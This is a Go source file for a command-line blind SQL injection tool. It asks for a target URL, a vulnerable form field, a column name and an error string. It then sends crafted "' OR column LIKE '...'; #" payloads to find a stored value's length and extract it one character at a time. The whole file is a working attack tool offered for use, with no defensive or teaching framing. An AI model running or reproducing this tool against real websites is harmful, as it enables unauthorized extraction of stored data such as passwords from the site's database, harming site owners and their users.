package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
)

const colorReset = "\033[0m"
const colorRed = "\033[31m"
const colorGreen = "\033[32m"
const colorBlue = "\033[34m"

const chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-!?@%"

var reader = bufio.NewReader(os.Stdin)

func handleError(message string, err error) {
	if err != nil {
		log.Fatal(message, "\n", err)
	}
}

func showHeader() {
	fmt.Print(colorRed)
	fmt.Println(`

  ███▄ ▄███▓ ▒█████   ██▀███   ▄████▄  ▓█████   ▄████  ▒█████  
 ▓██▒▀█▀ ██▒▒██▒  ██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀  ██▒ ▀█▒▒██▒  ██▒
 ▓██    ▓██░▒██░  ██▒▓██ ░▄█ ▒▒▓█    ▄ ▒███   ▒██░▄▄▄░▒██░  ██▒
 ▒██    ▒██ ▒██   ██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ ░▓█  ██▓▒██   ██░
 ▒██▒   ░██▒░ ████▓▒░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒░▒▓███▀▒░ ████▓▒░
 ░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░ ░▒   ▒ ░ ▒░▒░▒░ 
 ░  ░      ░  ░ ▒ ▒░   ░▒ ░ ▒░  ░  ▒    ░ ░  ░  ░   ░   ░ ▒ ▒░ 
 ░      ░   ░ ░ ░ ▒    ░░   ░ ░           ░   ░ ░   ░ ░ ░ ░ ▒  
        ░       ░ ░     ░     ░ ░         ░  ░      ░     ░ ░  
				                             ░                                
`)

}

func askFor(message string) string {
	fmt.Printf("  %s-> %s:%s ", colorBlue, message, colorReset)
	line, err := reader.ReadString('\n')
	handleError("Cannot read user input", err)
	return strings.TrimSuffix(line, "\n")
}

func attack() {
	targetUrl := askFor("URL")
	method := strings.ToUpper(askFor("Method [POST/GET]"))
	targetColumn := askFor("Target column")
	inputName := askFor("Vunerable input name")
	extraInputs := askFor("Extra inputs (pass=1234&something=321)")
	errorMessage := askFor("Error message")

	if method == "POST" {
		test := func(size int) bool {
			attempt := fmt.Sprintf("' OR %s LIKE '%s'; #", targetColumn, strings.Repeat("_", size))
			values, err := url.ParseQuery(fmt.Sprintf("%s=%s&%s", inputName, url.QueryEscape(attempt), extraInputs))
			res, err := http.PostForm(targetUrl, values)
			handleError("Cannot post form", err)

			defer res.Body.Close()

			bytes, err := ioutil.ReadAll(res.Body)

			body := string(bytes)

			return !strings.Contains(body, errorMessage)
		}
		size := 0
		result := false
		for !result {
			size++
			result = test(size)
		}
		fmt.Print(colorBlue)
		fmt.Println(`
       _,    _   _    ,_
  .o888P     Y8o8Y     Y888o.
 d88888      88888      88888b
d888888b_  _d88888b_  _d888888b
8888888888888888888888888888888
8888888888888888888888888888888
YJGS8P"Y888P"Y888P"Y888P"Y8888P
 Y888   '8'   Y8P   '8'   888Y
  '8o          V          o8'
    '                     '
		`)
		fmt.Printf("   %s=> Size: %d\n", colorGreen, size)

		check := func(index int, char string) bool {
			pattern := strings.Repeat("_", index)
			pattern += char
			pattern += strings.Repeat("_", size-index-1)

			attempt := fmt.Sprintf("' OR %s LIKE '%s'; #", targetColumn, pattern)
			values, err := url.ParseQuery(fmt.Sprintf("%s=%s&%s", inputName, url.QueryEscape(attempt), extraInputs))
			res, err := http.PostForm(targetUrl, values)
			if err != nil {
				res, err = http.PostForm(targetUrl, values)
			}
			handleError("Cannot post form", err)

			defer res.Body.Close()

			bytes, err := ioutil.ReadAll(res.Body)

			body := string(bytes)

			return !strings.Contains(body, errorMessage)
		}

		fmt.Printf("   %s=> ", colorGreen)
		for i := 0; i < size; i++ {
			found := false
			for _, char := range chars {
				str := string(char)
				if str == "_" {
					str = "\\_"
				} else if str == "%" {
					str = "\\@"
				}
				if check(i, str) {
					fmt.Print(string(char))
					found = true
					break
				}
			}
			if !found {
				fmt.Printf("%s?%s", colorRed, colorGreen)
			}
		}
		fmt.Println()
	}
}

func main() {
	showHeader()
	attack()
}
